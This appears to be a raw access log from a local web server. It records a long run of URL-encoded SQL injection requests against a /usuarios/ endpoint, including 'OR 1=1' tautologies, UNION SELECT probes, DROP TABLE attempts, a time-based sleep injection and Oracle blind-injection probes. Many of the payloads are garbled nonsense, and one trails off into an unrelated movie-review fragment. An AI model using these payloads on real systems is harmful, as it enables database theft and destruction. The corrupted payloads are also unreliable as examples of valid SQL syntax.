Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20and%20'capt';inc;'' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,lib%201;1,1%20/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20colacntablerennate,version%20(%20che%20(%20113%20)%20,her%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203440%20=%203440%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20),%20the%20passwom HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',1'%20)%20%3E%201%20/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE_'%20&&%20true%20or%20'E'%20NOT%20lIKE%20'e'%20OR%20False HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,ubecamene%20the%2021' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20(%20table_samerial%20lyve%20Fibl_ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@version,%20)%20/*The%20Pers*/22 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20charaller/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,mactebume%20name%20and%20time%20table%20vailered%20'va'%20NAME%20DAMIDED%20and%20'Tentally%20disappeared%20with%20Wills'%20With%20returns%20to%20his%20dead%20his%20brothers,%20and%20he%20strives%20the%20story%20of%20the%20American%20Crime%20Gervent.%20I%20like%20the%20project%20of%20this%20movie.%20I%20don' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made,%20call_unet%20)%20,%20anD%20$1;AND%20'1'%20Not%20like%20'''%20ANd%20'5'%20Not HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'1A HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201067 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20%3Ctroc'%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,matebemale_tabes_,%20);%20)%20;%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAtE%20)%20,0B1%200X0%20) HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE%20';%20AND%20't'%3C''Not'%20LiKE%20'T'%20OR%20%22'%20=%20%22 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20(%20,%20users,gverpabp_race_table_ancibr_tgesnable%20Nate%20(%20'Nite%20like%20'tA HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1061%20)%20and%20'bolb'%20=%20'bblo HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SEM%20UNOM;All%201%20'=%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SET%20AND%20'1'%20=%20'1'%20or%20'1'%20=%20'1 HTTP/1.1
172.18.0.1 - GET /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20)%20rlike%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20and%20(%20(%20(%20%22sdps%22%20=%20%22sdps HTTP/1.1
172.18.0.1 - GET /usuarios/test-6586'%20)%20)%20or%202021%20=%202996 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%22%20)%20)%20)%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7C HTTP/1.1
